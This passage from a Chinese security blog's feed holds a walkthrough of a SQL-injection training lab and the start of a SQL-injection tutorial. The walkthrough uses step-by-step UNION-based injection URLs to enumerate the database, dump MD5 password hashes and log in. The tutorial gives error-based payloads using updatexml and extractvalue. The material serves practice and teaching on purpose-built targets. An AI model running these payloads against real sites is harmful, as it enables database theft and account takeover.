&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Dumb &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Angelina &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Dummy &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> secure &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> stupid &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> superman &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> batman &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> admin &lt;span class="p">|&lt;/span> &lt;span class="m">123&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> admin1 &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> admin2 &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> admin3 &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> dhakkan &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> admin4 &lt;span class="p">|&lt;/span> password &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> admin&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="c1">#1 | 123 |&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+----------+----------+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul></description></item><item><title>SQL手工注入漏洞测试(MySQL数据库)</title><link>https://wlynxg.github.io/blog/p/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95mysql%E6%95%B0%E6%8D%AE%E5%BA%93/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95mysql%E6%95%B0%E6%8D%AE%E5%BA%93/</guid><description>&lt;h1 id="sql-手工注入漏洞测试mysql数据库">SQL 手工注入漏洞测试（MySQL数据库）
&lt;/h1>&lt;blockquote>
&lt;p>&lt;strong>题目信息：&lt;/strong>
&lt;strong>背景介绍&lt;/strong>
安全工程师&amp;quot;墨者&amp;quot;最近在练习SQL手工注入漏洞，自己刚搭建好一个靶场环境Nginx+PHP+MySQL，PHP代码对客户端提交的参数未做任何过滤。尽情的练习SQL手工注入吧
&lt;strong>实训目标&lt;/strong>
1.掌握SQL注入原理；
2.了解手工注入的方法；
3.了解MySQL的数据结构；
4.了解字符串的MD5加解密
&lt;strong>解题方向&lt;/strong>
手工进行SQL注入测试，获取管理密码登录。&lt;/p>
&lt;/blockquote>
&lt;h1 id="一进入靶场">一、进入靶场
&lt;/h1>&lt;p>本题要求为&lt;strong>SQL注入&lt;/strong>，那么我们就先去寻找注入点而不是直接爆破用户名和密码。
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171204.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h1 id="二在公告处发现注入点">二、在公告处发现注入点
&lt;/h1>&lt;p>&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171224.png"
loading="lazy"
alt="image.png"
>&lt;/p>
&lt;h1 id="三确定注入格式">三、确定注入格式
&lt;/h1>&lt;ol>
&lt;li>http://219.153.49.228:41317/new_list.php?id=1 and 1=1 &amp;raquo; &lt;strong>不报错，未过滤关键字&lt;/strong>&lt;/li>
&lt;li>http://219.153.49.228:41317/new_list.php?id=1 and 1=1 &amp;raquo; &lt;strong>报错，发现注入点&lt;/strong>&lt;/li>
&lt;/ol>
&lt;h1 id="四确定字段数">四、确定字段数
&lt;/h1>&lt;ol>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=1order by 1&lt;/code> &amp;raquo; &lt;strong>不报错&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=1order by 2&lt;/code> &amp;raquo; &lt;strong>不报错&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=1order by 3&lt;/code> &amp;raquo; &lt;strong>不报错&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=1order by 4&lt;/code> &amp;raquo; &lt;strong>不报错&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=1order by 5&lt;/code> &amp;raquo; &lt;strong>报错&lt;/strong>&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>确定字段数为4&lt;/strong>&lt;/p>
&lt;h1 id="五确定显示字段">五、确定显示字段
&lt;/h1>&lt;ul>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,2,3,4&lt;/code>
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171244.png"
loading="lazy"
alt="image.png"
>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>确定显示字段为2和3。&lt;/strong>&lt;/p>
&lt;h1 id="六查询数据库名字和版本">六、查询数据库名字和版本
&lt;/h1>&lt;ul>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,database(),version(),4&lt;/code>
&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171256.png"
loading="lazy"
alt="image.png"
>
&lt;strong>确定数据库名字为 &lt;em>mozhe_Discuz_StormGroup&lt;/em> ，数据库版本为 &lt;em>5.7.22-0ubuntu0.16.04.1&lt;/em> 。&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h1 id="七查询其它数据库名称">七、查询其它数据库名称
&lt;/h1>&lt;ol>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 0,1&lt;/code> &amp;raquo; &lt;strong>information_schema&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1&lt;/code> &amp;raquo; &lt;strong>mozhe_Discuz_StormGroup&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 2,1&lt;/code> &amp;raquo; &lt;strong>mysql&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 3,1&lt;/code> &amp;raquo; &lt;strong>performance_schema&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,schema_name,3,4 from information_schema.schemata limit 4,1&lt;/code> &amp;raquo; &lt;strong>sys&lt;/strong>&lt;/li>
&lt;/ol>
&lt;h1 id="八查询数据库表名">八、查询数据库表名
&lt;/h1>&lt;ol>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 0,1&lt;/code>&amp;raquo;&lt;strong>StormGroup_member&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,table_name,3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup' limit 1,1&lt;/code>&amp;raquo;&lt;strong>notice&lt;/strong>
&lt;strong>根据表名我们可以发现，&lt;em>StormGroup_member&lt;/em>这张表放的是用户信息，&lt;em>notice&lt;/em>这张表中放的是公告信息&lt;/strong>&lt;/li>
&lt;/ol>
&lt;h1 id="九查询表中字段名">九、查询表中字段名
&lt;/h1>&lt;ol>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1&lt;/code>&amp;raquo;&lt;strong>id, int(11)&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1&lt;/code>&amp;raquo;&lt;strong>name, varchar(20)&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1&lt;/code>&amp;raquo;&lt;strong>password, varchar(255)&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,column_name,column_type,4 from information_schema.columns where table_name='StormGroup_member' limit 0,1&lt;/code>&amp;raquo;&lt;strong>status, int(11)&lt;/strong>&lt;/li>
&lt;/ol>
&lt;h1 id="十查询用户信息">十、查询用户信息
&lt;/h1>&lt;ul>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,concat(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 0,1&lt;/code>&amp;raquo;&lt;strong>mozhe-356f589a7df439f6f744ff19bb8092c0-0&lt;/strong>&lt;/li>
&lt;li>&lt;code>http://219.153.49.228:41317/new_list.php?id=-1 union select 1,concat(name,'-',password,'-',status),3,4 from mozhe_Discuz_StormGroup.StormGroup_member limit 1,1&lt;/code>&amp;raquo;&lt;strong>mozhe-e2391899875e16f7013173cd17524303-1&lt;/strong>
&lt;strong>查询出了两条记录，发现密码长度都为32位，猜测应该是md5加密的，将密码放进&lt;a class="link" href="https://www.cmd5.com/" target="_blank" rel="noopener"
>解密网站&lt;/a>进行解密，使用用户名和密码登陆网站&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h1 id="十一登陆成功">十一、登陆成功
&lt;/h1>&lt;p>&lt;strong>下方就是我们需要提交的key了&lt;/strong>&lt;img src="https://raw.githubusercontent.com/wlynxg/pic/main/2025/06/01/20250601-171319.png"
loading="lazy"
alt="image.png"
>&lt;/p></description></item><item><title>SQL注入</title><link>https://wlynxg.github.io/blog/p/sql%E6%B3%A8%E5%85%A5/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/sql%E6%B3%A8%E5%85%A5/</guid><description>&lt;h1 id="sql-注入">SQL 注入
&lt;/h1>&lt;h2 id="一数据类型">一、数据类型
&lt;/h2>&lt;h3 id="1-数字型">1. 数字型
&lt;/h3>&lt;blockquote>
&lt;p>当输入参数为整数时，如果存在注入漏洞，那么可以认为此处存在数字型注入&lt;/p>
&lt;/blockquote>
&lt;p>例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">SQL模板&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">注入：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--+
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-字符型">2. 字符型
&lt;/h3>&lt;blockquote>
&lt;p>当输入参数为字符时，如果存在注入漏洞，那么可以认为此处存在字符型注入。字符型注入是最常见的注入，字符型注入一般需要进行引号闭合&lt;/p>
&lt;/blockquote>
&lt;p>例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">SQL模板&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;$name&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">注入：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;张三&amp;#39; and 1=1 --+&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;张三&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--+;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="3-搜索型">3. 搜索型
&lt;/h3>&lt;blockquote>
&lt;p>当网站存在搜索功能时，如果存在注入点，那么可以认为此处存在搜索型注入。搜索型注入和字符型注入类似，需要闭合符号&lt;/p>
&lt;/blockquote>
&lt;p>例如：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">SQL模板&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">like&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;%$name%&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">注入：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;三%&amp;#39; and 1=1 --+&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">table_name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">where&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">like&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;%三%&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">and&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--+;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="二注入方式">二、注入方式
&lt;/h2>&lt;h3 id="1-联合查询注入">1. 联合查询注入
&lt;/h3>&lt;h4 id="概念">概念
&lt;/h4>&lt;blockquote>
&lt;p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合在一起&lt;/p>
&lt;/blockquote>
&lt;h4 id="示例">示例
&lt;/h4>&lt;p>PS：本文都使用 sqli-labs 第一关作为示例！&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="err">查询数据库版本和数据库名称：&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">group_concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">database&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">--+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-报错回显注入">2. 报错回显注入
&lt;/h3>&lt;h4 id="概念-1">概念
&lt;/h4>&lt;blockquote>
&lt;p>一些网站在查询数据库时，没有关闭数据库查询出错时错误信息的输出。在SQL中的某些函数，在出错时会给出一些提示信息，报错回显注入就是利用这些函数来输出我们需要的结果&lt;/p>
&lt;/blockquote>
&lt;h4 id="注入函数">注入函数
&lt;/h4>&lt;h5 id="updatexml">updatexml()
&lt;/h5>&lt;p>&lt;strong>基本信息&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>UPDATEXML (XML_document, XPath_string, new_value):
&lt;ul>
&lt;li>第一个参数：xml 文档 ;&lt;/li>
&lt;li>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程;&lt;/li>
&lt;li>第三个参数：替换查找到的符合条件的数据 ；&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>错误输出最大长度为32位。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>报错原因&lt;/strong>&lt;/p>
&lt;p>当第二个参数不符合 xpath 语法时，函数使用报错。&lt;/p>
&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39; and updatexml(1,concat(0x7e,(select group_concat(username) from users), 0x7e), 1) -- +
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h5 id="extractvalue">extractvalue()
&lt;/h5>&lt;p>&lt;strong>基本信息&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>extractvalue(XML_document, XPath_string):
&lt;ul>
&lt;li>XML_document：目标xml文档；&lt;/li>
&lt;li>XPath_string：Xpath字符串；&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>错误输出最大长度为32位。&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>注入使用格式&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">extractvalue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;a&amp;gt;&amp;lt;b&amp;gt;&amp;lt;b/&amp;gt;&amp;lt;/a&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">,(&lt;/span>&lt;span class="err">注入语句&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>报错原因&lt;/strong>&lt;/p>
&lt;p>当第二个参数不符合 xpath 语法时，函数使用报错。&lt;/p>
&lt;p>&lt;strong>示例&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
